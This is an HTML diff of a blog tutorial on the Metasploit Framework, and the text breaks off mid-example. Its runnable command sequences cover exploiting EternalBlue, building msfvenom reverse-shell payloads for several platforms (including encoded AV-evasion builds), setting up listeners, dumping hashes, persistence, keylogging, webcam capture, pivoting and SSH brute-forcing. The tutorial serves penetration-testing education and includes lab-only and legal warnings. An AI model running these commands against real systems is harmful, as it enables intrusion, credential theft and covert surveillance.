-                <strong style="color:#00ff88;">The Industry Standard</strong> — Master the world's most powerful penetration testing framework!
-            </p>
+        <div class="meta-bar">
+            <div class="meta-item"><span class="ico">📖</span> <span>Reading time: <strong>28 min</strong></span></div>
+            <div class="meta-item"><span class="ico">💥</span> <span>Category: <strong>Security Tools</strong></span></div>
+            <div class="meta-item"><span class="ico">🛡️</span> <span>Level: <strong>Beginner → Advanced</strong></span></div>
+            <div class="meta-item"><span class="ico">⚡</span> <span>Updated: <strong>2025</strong></span></div>
         </div>
+    </header>
 
-        <!-- ===== FEATURED IMAGES WITH AMAZON LINK ===== -->
-        <div class="featured-box">
-            <div class="featured-image">
-                <a href="https://www.amazon.com/dp/B0H7793S4V" target="_blank" rel="noopener">
-                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhKHajpAXO9g5kSm85VxzSQsl-VPM6w7pM8IcZ9m39ZNGTo-J8hqRYUnjBhAkIfuXxO8xLc4AgJ8SqlLmVCs5kKSbm3JkEqEriw8mHwIAMIKITlJeqwEHKYljXP_nkcV4wD-S9rSmDPu-WHUMv-1sFueh3tnXUbICX-WYHaHGpawj07X7m0GSkKvWdzrnQa/s320/Metasploit_image.png" 
-                         alt="Mastering Metasploit Book"/>
-                </a>
-                
+    <!-- ===== TABLE OF CONTENTS ===== -->
+    <nav class="toc">
+        <div class="toc-title">📑 Table of Contents</div>
+        <ul class="toc-list">
+            <li><a href="#intro"><span class="num">01</span> Introduction</a></li>
+            <li><a href="#why"><span class="num">02</span> Why Metasploit?</a></li>
+            <li><a href="#install"><span class="num">03</span> Installation</a></li>
+            <li><a href="#interface"><span class="num">04</span> msfconsole</a></li>
+            <li><a href="#modules"><span class="num">05</span> Module Types</a></li>
+            <li><a href="#search"><span class="num">06</span> Search &amp; Use</a></li>
+            <li><a href="#options"><span class="num">07</span> Configuring Modules</a></li>
+            <li><a href="#first"><span class="num">08</span> Your First Exploit</a></li>
+            <li><a href="#meterpreter"><span class="num">09</span> Meterpreter</a></li>
+            <li><a href="#msfvenom"><span class="num">10</span> msfvenom Payloads</a></li>
+            <li><a href="#post"><span class="num">11</span> Post-Exploitation</a></li>
+            <li><a href="#pivot"><span class="num">12</span> Pivoting</a></li>
+            <li><a href="#handlers"><span class="num">13</span> Handlers &amp; Reverse Shells</a></li>
+            <li><a href="#auxiliary"><span class="num">14</span> Auxiliary Modules</a></li>
+            <li><a href="#db"><span class="num">15</span> Database Integration</a></li>
+            <li><a href="#best"><span class="num">16</span> Best Practices</a></li>
+            <li><a href="#legal"><span class="num">17</span> Legal &amp; Ethics</a></li>
+            <li><a href="#conclusion"><span class="num">18</span> Conclusion</a></li>
+        </ul>
+    </nav>
+
+    <!-- ===== 01 INTRO ===== -->
+    <section class="section" id="intro">
+        <span class="section-number">01 · INTRODUCTION</span>
+        <h2 class="section-title">
+            <span class="icon">💥</span>
+            What Is Metasploit?
+        </h2>
+        <p>
+            <strong>Metasploit Framework</strong> is the world's most widely used <em>penetration testing framework</em>. Originally created by H.D. Moore in 2003, it was acquired by Rapid7 in 2009 and has become the de facto standard for exploit development, delivery, and post-exploitation.
+        </p>
+        <p>
+            Metasploit provides a complete environment for testing vulnerabilities: a massive database of <strong>exploits</strong> (2000+), <strong>payloads</strong>, <strong>encoders</strong>, <strong>auxiliary modules</strong>, and <strong>post-exploitation modules</strong>. It handles everything from reconnaissance to gaining a shell and pivoting deeper into a network.
+        </p>
+        <p>
+            For ethical hackers, Metasploit is <strong>essential</strong>. It's used daily by penetration testers, red teams, and bug bounty hunters. It's also a favorite target for defenders — many security tools are designed specifically to detect Metasploit's default behaviors.
+        </p>
+        <div class="callout info">
+            <strong>💡 Note:</strong> Metasploit is written in <strong>Ruby</strong>. If you want to write custom modules, you'll need to learn Ruby. But for using it, no programming is required.
+        </div>
+    </section>
+
+    <!-- ===== 02 WHY ===== -->
+    <section class="section" id="why">
+        <span class="section-number">02 · WHY METASPLOIT</span>
+        <h2 class="section-title">
+            <span class="icon">💡</span>
+            Why Ethical Hackers Use Metasploit
+        </h2>
+        <div class="use-grid">
+            <div class="use-card">
+                <span class="use-icon">🎯</span>
+                <h4>2000+ Exploits</h4>
+                <p>Massive library of exploits for Windows, Linux, macOS, Android, and web apps.</p>
             </div>
-            <div class="featured-cta">
-                <p>📚 <strong style="color:#00ff88;">Get Your Copy Today!</strong></p>
-                <a class="main-link" href="https://www.amazon.com/dp/B0H7793S4V" target="_blank" rel="noopener">
-                    🛒 Buy Now on Amazon
-                </a>
-               
+            <div class="use-card">
+                <span class="use-icon">🔧</span>
+                <h4>All-in-One</h4>
+                <p>Recon, exploit, post-exploit, pivot — everything in one framework.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🐚</span>
+                <h4>Meterpreter</h4>
+                <p>Advanced post-exploitation payload with dozens of features.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">⚡</span>
+                <h4>Fast Prototyping</h4>
+                <p>From scan to shell in minutes with the right module.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🌐</span>
+                <h4>Cross-Platform</h4>
+                <p>Runs on Windows, Linux, macOS, and cloud platforms.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">📊</span>
+                <h4>Integrations</h4>
+                <p>Works with Nmap, Nessus, Burp, and dozens more tools.</p>
             </div>
         </div>
+        <div class="callout">
+            <strong>🔑 Key Insight:</strong> Metasploit is not a magic bullet — it's a framework. You still need to understand the vulnerability, the target, and the attack chain. It just makes exploitation easier.
+        </div>
+    </section>
 
-        <!-- ===== DETAILS ===== -->
-        <p>
-            Inside, you'll learn how to install and configure Metasploit, understand its architecture, discover and validate vulnerabilities, use auxiliary modules, manage payloads, work with Meterpreter, perform post-exploitation tasks, and document your findings. Each chapter includes clear explanations, hands-on examples, and best practices to help you build real-world skills.
-        </p>
+    <!-- ===== 03 INSTALL ===== -->
+    <section class="section" id="install">
+        <span class="section-number">03 · INSTALLATION</span>
+        <h2 class="section-title">
+            <span class="icon">⬇️</span>
+            Installing Metasploit
+        </h2>
 
-        <div class="ethics-box">
-            <p>🛡️ This book emphasizes <strong style="color:#ff6b6b;">ethical and legal security testing</strong>. All demonstrations are intended for authorized systems, labs, and educational environments only.</p>
+        <h3>Option 1: Pre-installed on Kali</h3>
+        <p>Metasploit comes pre-installed on Kali Linux. Just run:</p>
+        <div class="code-block" data-lang="bash">
+<code><span class="cmd">sudo</span> msfconsole</code>
         </div>
 
+        <h3>Option 2: Install on Kali</h3>
+        <div class="code-block" data-lang="bash">
+<code><span class="cmd">sudo</span> apt update
+<span class="cmd">sudo</span> apt install metasploit-framework
+
+<span class="cmt"># Start the database service</span>
+<span class="cmd">sudo</span> systemctl start postgresql
+<span class="cmd">sudo</span> systemctl enable postgresql
+
+<span class="cmt"># Initialize the database</span>
+<span class="cmd">sudo</span> msfdb init
+
+<span class="cmt"># Launch Metasploit</span>
+<span class="cmd">sudo</span> msfconsole</code>
+        </div>
+
+        <h3>Option 3: Official Installer (Linux/macOS)</h3>
+        <div class="code-block" data-lang="bash">
+<code><span class="cmd">curl</span> https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall
+<span class="cmd">chmod</span> 755 msfinstall
+<span class="cmd">sudo</span> ./msfinstall</code>
+        </div>
+
+        <div class="callout info">
+            <strong>💡 Note:</strong> Metasploit needs PostgreSQL for its database features. Always run <code>msfdb init</code> before starting <code>msfconsole</code>.
+        </div>
+    </section>
+
+    <!-- ===== 04 INTERFACE ===== -->
+    <section class="section" id="interface">
+        <span class="section-number">04 · msfconsole</span>
+        <h2 class="section-title">
+            <span class="icon">🖥️</span>
+            The msfconsole Interface
+        </h2>
+
         <p>
-            Whether you're preparing for cybersecurity certifications, building a home lab, or expanding your penetration testing knowledge, this guide provides a practical foundation for learning Metasploit safely and effectively.
+            <code>msfconsole</code> is the primary interface for Metasploit. It's a Ruby-powered shell where you type commands to search, configure, and launch modules.
         </p>
 
-        <hr/>
+        <h3>Essential Commands</h3>
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>Command</th><th>Purpose</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><code>help</code></td><td>Show all available commands</td></tr>
+                    <tr><td><code>search &lt;term&gt;</code></td><td>Search for modules</td></tr>
+                    <tr><td><code>use &lt;module&gt;</code></td><td>Select a module</td></tr>
+                    <tr><td><code>show options</code></td><td>Show module settings</td></tr>
+                    <tr><td><code>show payloads</code></td><td>List compatible payloads</td></tr>
+                    <tr><td><code>show targets</code></td><td>List supported targets</td></tr>
+                    <tr><td><code>set &lt;option&gt; &lt;value&gt;</code></td><td>Set an option</td></tr>
+                    <tr><td><code>setg &lt;option&gt; &lt;value&gt;</code></td><td>Set global option</td></tr>
+                    <tr><td><code>unset &lt;option&gt;</code></td><td>Clear an option</td></tr>
+                    <tr><td><code>run</code> or <code>exploit</code></td><td>Execute the module</td></tr>
+                    <tr><td><code>check</code></td><td>Verify if target is vulnerable</td></tr>
+                    <tr><td><code>back</code></td><td>Exit the current module</td></tr>
+                    <tr><td><code>info</code></td><td>Show module details</td></tr>
+                    <tr><td><code>sessions</code></td><td>List active sessions</td></tr>
+                    <tr><td><code>jobs</code></td><td>List background jobs</td></tr>
+                    <tr><td><code>exit</code></td><td>Quit Metasploit</td></tr>
+                </tbody>
+            </table>
+        </div>
 
-        <!-- ===== WHAT YOU'LL LEARN ===== -->
-        <h2 id="learn">📖 What You'll Learn</h2>
-        <ul class="two-col-list">
-            <li>Installing and configuring Metasploit</li>
-            <li>Understanding modules and payloads</li>
-            <li>Scanning and validating vulnerabilities</li>
-            <li>Using Meterpreter for post-exploitation</li>
-            <li>Managing sessions and automation</li>
-            <li>Reporting findings professionally</li>
-            <li>Security testing best practices and ethics</li>
+        <div class="code-block" data-lang="bash">
+<code>msf6 &gt; <span class="cmd">help</span>
+msf6 &gt; <span class="cmd">version</span>
+msf6 &gt; <span class="cmd">banner</span>
+msf6 &gt; <span class="cmd">clear</span></code>
+        </div>
+    </section>
+
+    <!-- ===== 05 MODULES ===== -->
+    <section class="section" id="modules">
+        <span class="section-number">05 · MODULE TYPES</span>
+        <h2 class="section-title">
+            <span class="icon">📦</span>
+            Metasploit Module Types
+        </h2>
+
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>Type</th><th>Purpose</th><th>Example</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><strong>exploit</strong></td><td>Exploit a vulnerability to gain access</td><td><code>ms17_010_eternalblue</code></td></tr>
+                    <tr><td><strong>payload</strong></td><td>Code that runs after successful exploit</td><td><code>windows/meterpreter/reverse_tcp</code></td></tr>
+                    <tr><td><strong>auxiliary</strong></td><td>Scanning, fuzzing, sniffing, enumeration</td><td><code>scanner/ssh/ssh_login</code></td></tr>
+                    <tr><td><strong>post</strong></td><td>Post-exploitation actions on a session</td><td><code>windows/gather/hashdump</code></td></tr>
+                    <tr><td><strong>encoder</strong></td><td>Encode payloads to bypass AV</td><td><code>x86/shikata_ga_nai</code></td></tr>
+                    <tr><td><strong>nop</strong></td><td>Generate NOP sleds for shellcode</td><td><code>x86/single_byte</code></td></tr>
+                    <tr><td><strong>evasion</strong></td><td>Bypass AV/EDR detection</td><td><code>windows/windows_defender_exe</code></td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3>Common Payload Types</h3>
+        <div class="use-grid">
+            <div class="use-card">
+                <span class="use-icon">🐚</span>
+                <h4>Reverse Shell</h4>
+                <p>Target connects back to attacker — bypasses firewalls.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🔗</span>
+                <h4>Bind Shell</h4>
+                <p>Target opens a listener — attacker connects in.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🎯</span>
+                <h4>Meterpreter</h4>
+                <p>Advanced payload with in-memory execution and rich features.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">💻</span>
+                <h4>Staged vs Stageless</h4>
+                <p>Staged delivers small loader + big payload; stageless is single payload.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== 06 SEARCH ===== -->
+    <section class="section" id="search">
+        <span class="section-number">06 · SEARCH &amp; USE</span>
+        <h2 class="section-title">
+            <span class="icon">🔍</span>
+            Searching &amp; Loading Modules
+        </h2>
+
+        <h3>Search Syntax</h3>
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Basic search</span>
+msf6 &gt; <span class="cmd">search</span> ms17-010
+
+<span class="cmt"># Filter by type</span>
+msf6 &gt; <span class="cmd">search</span> type:exploit platform:windows smb
+
+<span class="cmt"># Filter by CVE</span>
+msf6 &gt; <span class="cmd">search</span> cve:2021-44228
+
+<span class="cmt"># Filter by author</span>
+msf6 &gt; <span class="cmd">search</span> author:hdmoore
+
+<span class="cmt"># Filter by rank (excellent, great, good, normal, average, low, manual)</span>
+msf6 &gt; <span class="cmd">search</span> rank:excellent type:exploit
+
+<span class="cmt"># Combine filters</span>
+msf6 &gt; <span class="cmd">search</span> type:auxiliary name:ssh platform:linux
+
+<span class="cmt"># Search by port</span>
+msf6 &gt; <span class="cmd">search</span> port:445 type:exploit</code>
+        </div>
+
+        <h3>Using a Module</h3>
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Select the module</span>
+msf6 &gt; <span class="cmd">use</span> exploit/windows/smb/ms17_010_eternalblue
+
+<span class="cmt"># Show info about it</span>
+msf6 exploit(...) &gt; <span class="cmd">info</span>
+
+<span class="cmt"># Show required options</span>
+msf6 exploit(...) &gt; <span class="cmd">show</span> options</code>
+        </div>
+    </section>
+
+    <!-- ===== 07 OPTIONS ===== -->
+    <section class="section" id="options">
+        <span class="section-number">07 · CONFIGURING MODULES</span>
+        <h2 class="section-title">
+            <span class="icon">⚙️</span>
+            Configuring Module Options
+        </h2>
+
+        <p>
+            Every module has options you must configure. The most common are <strong>RHOSTS</strong> (target), <strong>RPORT</strong> (target port), <strong>LHOST</strong> (your IP), and <strong>LPORT</strong> (your listening port).
+        </p>
+
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Set target</span>
+msf6 exploit(...) &gt; <span class="cmd">set</span> RHOSTS 192.168.1.100
+msf6 exploit(...) &gt; <span class="cmd">set</span> RPORT 445
+
+<span class="cmt"># Set our listener</span>
+msf6 exploit(...) &gt; <span class="cmd">set</span> LHOST 192.168.1.50
+msf6 exploit(...) &gt; <span class="cmd">set</span> LPORT 4444
+
+<span class="cmt"># Choose payload</span>
+msf6 exploit(...) &gt; <span class="cmd">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+<span class="cmt"># Set target (0 = auto)</span>
+msf6 exploit(...) &gt; <span class="cmd">set</span> TARGET 0
+
+<span class="cmt"># Global options (apply to all modules)</span>
+msf6 &gt; <span class="cmd">setg</span> LHOST 192.168.1.50
+msf6 &gt; <span class="cmd">setg</span> LPORT 4444
+
+<span class="cmt"># Verify options</span>
+msf6 exploit(...) &gt; <span class="cmd">show</span> options</code>
+        </div>
+
+        <div class="callout">
+            <strong>💡 Pro Tip:</strong> Use <code>setg</code> for LHOST and LPORT at the top level — they'll apply to every module you use afterward, saving you typing.
+        </div>
+    </section>
+
+    <!-- ===== 08 FIRST ===== -->
+    <section class="section" id="first">
+        <span class="section-number">08 · YOUR FIRST EXPLOIT</span>
+        <h2 class="section-title">
+            <span class="icon">🚀</span>
+            Running Your First Exploit
+        </h2>
+
+        <p>
+            Let's walk through a full exploitation workflow using the famous <strong>MS17-010 EternalBlue</strong> vulnerability (Windows SMB). Only test this against a lab machine like <em>Metasploitable3</em> or a Windows 7/2008 VM.
+        </p>
+
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Step 1: Launch msfconsole</span>
+<span class="cmd">sudo</span> msfconsole
+
+<span class="cmt"># Step 2: Search for the exploit</span>
+msf6 &gt; <span class="cmd">search</span> ms17-010
+
+<span class="cmt"># Step 3: Use the module</span>
+msf6 &gt; <span class="cmd">use</span> exploit/windows/smb/ms17_010_eternalblue
+
+<span class="cmt"># Step 4: Show options</span>
+msf6 exploit(...) &gt; <span class="cmd">show</span> options
+
+<span class="cmt"># Step 5: Configure</span>
+msf6 exploit(...) &gt; <span class="cmd">set</span> RHOSTS 192.168.1.100
+msf6 exploit(...) &gt; <span class="cmd">set</span> LHOST 192.168.1.50
+msf6 exploit(...) &gt; <span class="cmd">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+<span class="cmt"># Step 6: Verify target is vulnerable</span>
+msf6 exploit(...) &gt; <span class="cmd">check</span>
+
+<span class="cmt"># Step 7: Exploit!</span>
+msf6 exploit(...) &gt; <span class="cmd">exploit</span></code>
+        </div>
+
+        <p>After a successful exploit, you'll see something like:</p>
+
+        <div class="code-block" data-lang="text">
+<code>[*] Started reverse TCP handler on 192.168.1.50:4444
+[*] 192.168.1.100:445 - Connecting to target...
+[+] 192.168.1.100:445 - Connection established
+[*] 192.168.1.100:445 - Target OS: Windows 7 Ultimate
+[+] 192.168.1.100:445 - Shellcode injected!
+[*] Meterpreter session 1 opened (192.168.1.50:4444 → 192.168.1.100:49158)
+
+meterpreter &gt;</code>
+        </div>
+
+        <div class="callout warn">
+            <strong>⚠️ Legal Warning:</strong> EternalBlue crashed countless systems worldwide. Never run it against systems you don't own or have permission to test. Practice on Metasploitable3 or a local Windows VM.
+        </div>
+    </section>
+
+    <!-- ===== 09 METERPRETER ===== -->
+    <section class="section" id="meterpreter">
+        <span class="section-number">09 · METERPRETER</span>
+        <h2 class="section-title">
+            <span class="icon">🐚</span>
+            Meterpreter — The Ultimate Payload
+        </h2>
+        <p>
+            <strong>Meterpreter</strong> is Metasploit's flagship payload. It runs entirely in memory, communicates over encrypted channels, and provides dozens of post-exploitation commands without touching disk.
+        </p>
+
+        <h3>Essential Meterpreter Commands</h3>
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>Command</th><th>Purpose</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><code>sysinfo</code></td><td>System information</td></tr>
+                    <tr><td><code>getuid</code></td><td>Current user</td></tr>
+                    <tr><td><code>getsystem</code></td><td>Attempt privilege escalation</td></tr>
+                    <tr><td><code>ps</code></td><td>List processes</td></tr>
+                    <tr><td><code>migrate &lt;pid&gt;</code></td><td>Move to another process</td></tr>
+                    <tr><td><code>shell</code></td><td>Drop to system shell</td></tr>
+                    <tr><td><code>hashdump</code></td><td>Dump password hashes</td></tr>
+                    <tr><td><code>ls</code></td><td>List files</td></tr>
+                    <tr><td><code>cd</code></td><td>Change directory</td></tr>
+                    <tr><td><code>upload / download</code></td><td>Transfer files</td></tr>
+                    <tr><td><code>keyscan_start / dump</code></td><td>Keylogger</td></tr>
+                    <tr><td><code>screenshot</code></td><td>Capture screen</td></tr>
+                    <tr><td><code>webcam_snap</code></td><td>Take webcam photo</td></tr>
+                    <tr><td><code>sessions</code></td><td>Background/switch sessions</td></tr>
+                    <tr><td><code>background</code></td><td>Background current session</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="code-block" data-lang="bash">
+<code>meterpreter &gt; <span class="cmd">sysinfo</span>
+meterpreter &gt; <span class="cmd">getuid</span>
+meterpreter &gt; <span class="cmd">getsystem</span>
+meterpreter &gt; <span class="cmd">hashdump</span>
+meterpreter &gt; <span class="cmd">shell</span>
+C:\Windows\system32&gt; <span class="cmd">whoami</span>
+C:\Windows\system32&gt; <span class="cmd">exit</span>
+meterpreter &gt; <span class="cmd">background</span></code>
+        </div>
+    </section>
+
+    <!-- ===== 10 MSFVENOM ===== -->
+    <section class="section" id="msfvenom">
+        <span class="section-number">10 · MSFVENOM</span>
+        <h2 class="section-title">
+            <span class="icon">💣</span>
+            msfvenom — Payload Generation
+        </h2>
+        <p>
+            <strong>msfvenom</strong> combines <code>msfpayload</code> and <code>msfencode</code> into one tool for generating standalone payloads in dozens of formats.
+        </p>
+
+        <h3>Basic Syntax</h3>
+        <div class="code-block" data-lang="bash">
+<code>msfvenom -p &lt;payload&gt; LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f &lt;format&gt; -o &lt;output&gt;</code>
+        </div>
+
+        <h3>Common Payload Examples</h3>
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Windows EXE (reverse shell)</span>
+<span class="cmd">msfvenom</span> -p windows/x64/meterpreter/reverse_tcp \
+    LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe
+
+<span class="cmt"># Windows EXE (reverse shell, stageless)</span>
+<span class="cmd">msfvenom</span> -p windows/x64/meterpreter_reverse_tcp \
+    LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe
+
+<span class="cmt"># Linux ELF</span>
+<span class="cmd">msfvenom</span> -p linux/x64/meterpreter/reverse_tcp \
+    LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf
+
+<span class="cmt"># PHP webshell</span>
+<span class="cmd">msfvenom</span> -p php/meterpreter/reverse_tcp \
+    LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php
+
+<span class="cmt"># Python reverse shell</span>
+<span class="cmd">msfvenom</span> -p python/meterpreter/reverse_tcp \
+    LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py
+
+<span class="cmt"># Android APK</span>
+<span class="cmd">msfvenom</span> -p android/meterpreter/reverse_tcp \
+    LHOST=192.168.1.50 LPORT=4444 -o shell.apk
+
+<span class="cmt"># JSP web app</span>
+<span class="cmd">msfvenom</span> -p java/jsp_shell_reverse_tcp \
+    LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp
+
+<span class="cmt"># ASP (Windows IIS)</span>
+<span class="cmd">msfvenom</span> -p windows/meterpreter/reverse_tcp \
+    LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp
+
+<span class="cmt"># PowerShell one-liner</span>
+<span class="cmd">msfvenom</span> -p windows/x64/meterpreter/reverse_tcp \
+    LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1
+
+<span class="cmt"># Base64-encoded (for command injection)</span>
+<span class="cmd">msfvenom</span> -p windows/x64/meterpreter/reverse_tcp \
+    LHOST=192.168.1.50 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o shell_enc.exe</code>
+        </div>
+
+        <h3>Handlers — Catching Payloads</h3>
+        <p>Standalone payloads need a listener. Use <code>exploit/multi/handler</code>:</p>
+
+        <div class="code-block" data-lang="bash">
+<code>msf6 &gt; <span class="cmd">use</span> exploit/multi/handler
+msf6 exploit(handler) &gt; <span class="cmd">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(handler) &gt; <span class="cmd">set</span> LHOST 192.168.1.50
+msf6 exploit(handler) &gt; <span class="cmd">set</span> LPORT 4444
+msf6 exploit(handler) &gt; <span class="cmd">set</span> ExitOnSession false
+msf6 exploit(handler) &gt; <span class="cmd">exploit</span> -j</code>
+        </div>
+    </section>
+
+    <!-- ===== 11 POST ===== -->
+    <section class="section" id="post">
+        <span class="section-number">11 · POST-EXPLOITATION</span>
+        <h2 class="section-title">
+            <span class="icon">🎯</span>
+            Post-Exploitation Modules
+        </h2>
+
+        <div class="use-grid">
+            <div class="use-card">
+                <span class="use-icon">🔑</span>
+                <h4>Credential Dumping</h4>
+                <p><code>post/windows/gather/hashdump</code> — extract NTLM hashes.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🕵️</span>
+                <h4>Enumeration</h4>
+                <p><code>post/windows/gather/enum_*</code> — enumerate everything.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">📤</span>
+                <h4>Data Exfiltration</h4>
+                <p>Package and exfiltrate files via Meterpreter.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🔓</span>
+                <h4>Persistence</h4>
+                <p><code>post/windows/manage/persistence*</code> — install backdoor.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🧹</span>
+                <h4>Cleanup</h4>
+                <p>Clear event logs and remove traces.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">📸</span>
+                <h4>Surveillance</h4>
+                <p>Keylogger, screenshots, webcam, microphone.</p>
+            </div>
+        </div>
+
+        <div class="code-block" data-lang="bash">
+<code>meterpreter &gt; <span class="cmd">run</span> post/windows/gather/hashdump
+meterpreter &gt; <span class="cmd">run</span> post/windows/gather/enum_logged_on_users
+meterpreter &gt; <span class="cmd">run</span> post/windows/gather/credentials/windows_autologin
+meterpreter &gt; <span class="cmd">run</span> post/multi/recon/local_exploit_suggester</code>
+        </div>
+    </section>
+
+    <!-- ===== 12 PIVOT ===== -->
+    <section class="section" id="pivot">
+        <span class="section-number">12 · PIVOTING</span>
+        <h2 class="section-title">
+            <span class="icon">🔀</span>
+            Pivoting Into Internal Networks
+        </h2>
+        <p>
+            Once you've compromised a host, you can use it as a <strong>pivot point</strong> to attack other machines on the same internal network.
+        </p>
+
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Step 1: Add route through the compromised host</span>
+meterpreter &gt; <span class="cmd">run</span> post/multi/manage/autoroute
+meterpreter &gt; <span class="cmd">background</span>
+
+<span class="cmt"># Step 2: Set up SOCKS proxy for tools</span>
+msf6 &gt; <span class="cmd">use</span> auxiliary/server/socks_proxy
+msf6 &gt; <span class="cmd">set</span> SRVHOST 127.0.0.1
+msf6 &gt; <span class="cmd">set</span> SRVPORT 1080
+msf6 &gt; <span class="cmd">set</span> VERSION 5
+msf6 &gt; <span class="cmd">run</span> -j
+
+<span class="cmt"># Step 3: Use proxychains to route other tools</span>
+<span class="cmd">proxychains</span> nmap -sT -Pn 10.10.10.0/24
+
+<span class="cmt"># Step 4: Or use Metasploit modules with Route</span>
+msf6 &gt; <span class="cmd">use</span> exploit/windows/smb/ms17_010_eternalblue
+msf6 &gt; <span class="cmd">set</span> RHOSTS 10.10.10.5
+msf6 &gt; <span class="cmd">set</span> PAYLOAD windows/x64/meterpreter/bind_tcp
+msf6 &gt; <span class="cmd">exploit</span></code>
+        </div>
+
+        <div class="callout">
+            <strong>💡 Pro Tip:</strong> Use <code>bind_tcp</code> payloads for pivoting through strict firewalls. The compromised host opens the listener, and you connect through the pivot.
+        </div>
+    </section>
+
+    <!-- ===== 13 HANDLERS ===== -->
+    <section class="section" id="handlers">
+        <span class="section-number">13 · HANDLERS</span>
+        <h2 class="section-title">
+            <span class="icon">📡</span>
+            Reverse Shell Handlers
+        </h2>
+
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Multi-handler (most flexible — works with any payload)</span>
+msf6 &gt; <span class="cmd">use</span> exploit/multi/handler
+msf6 exploit(handler) &gt; <span class="cmd">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(handler) &gt; <span class="cmd">set</span> LHOST 192.168.1.50
+msf6 exploit(handler) &gt; <span class="cmd">set</span> LPORT 4444
+msf6 exploit(handler) &gt; <span class="cmd">set</span> ExitOnSession false
+msf6 exploit(handler) &gt; <span class="cmd">exploit</span> -j -z
+
+<span class="cmt"># List sessions</span>
+msf6 &gt; <span class="cmd">sessions</span> -l
+
+<span class="cmt"># Interact with session 1</span>
+msf6 &gt; <span class="cmd">sessions</span> -i 1
+
+<span class="cmt"># Background it</span>
+meterpreter &gt; <span class="cmd">background</span>
+
+<span class="cmt"># Kill a session</span>
+msf6 &gt; <span class="cmd">sessions</span> -k 1
+
+<span class="cmt"># Kill all sessions</span>
+msf6 &gt; <span class="cmd">sessions</span> -K</code>
+        </div>
+
+        <h3>Simple Netcat Listener (Without Metasploit)</h3>
+        <div class="code-block" data-lang="bash">
+<code><span class="cmd">nc</span> -lvnp 4444
+<span class="cmt"># Then use a raw reverse shell payload from msfvenom</span></code>
+        </div>
+    </section>
+
+    <!-- ===== 14 AUXILIARY ===== -->
+    <section class="section" id="auxiliary">
+        <span class="section-number">14 · AUXILIARY MODULES</span>
+        <h2 class="section-title">
+            <span class="icon">🔎</span>
+            Auxiliary Modules — Scanning &amp; Enumeration
+        </h2>
+
+        <h3>Popular Auxiliary Modules</h3>
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>Module</th><th>Purpose</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><code>auxiliary/scanner/portscan/tcp</code></td><td>TCP port scan</td></tr>
+                    <tr><td><code>auxiliary/scanner/smb/smb_version</code></td><td>SMB version detection</td></tr>
+                    <tr><td><code>auxiliary/scanner/smb/smb_enumusers</code></td><td>Enumerate SMB users</td></tr>
+                    <tr><td><code>auxiliary/scanner/ssh/ssh_login</code></td><td>SSH login brute-force</td></tr>
+                    <tr><td><code>auxiliary/scanner/ftp/ftp_login</code></td><td>FTP brute-force</td></tr>
+                    <tr><td><code>auxiliary/scanner/http/http_version</code></td><td>HTTP server version</td></tr>
+                    <tr><td><code>auxiliary/scanner/http/dir_scanner</code></td><td>Web directory scan</td></tr>
+                    <tr><td><code>auxiliary/scanner/mysql/mysql_login</code></td><td>MySQL login brute-force</td></tr>
+                    <tr><td><code>auxiliary/scanner/snmp/snmp_enum</code></td><td>SNMP enumeration</td></tr>
+                    <tr><td><code>auxiliary/scanner/vnc/vnc_none_auth</code></td><td>VNC no-auth check</td></tr>
+                    <tr><td><code>auxiliary/gather/ldap_query</code></td><td>LDAP enumeration</td></tr>
+                    <tr><td><code>auxiliary/sniffer/psnuffle</code></td><td>Password sniffer</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Example: SSH brute-force</span>
+msf6 &gt; <span class="cmd">use</span> auxiliary/scanner/ssh/ssh_login
+msf6 auxiliary(...) &gt; <span class="cmd">set</span> RHOSTS 192.168.1.0/24
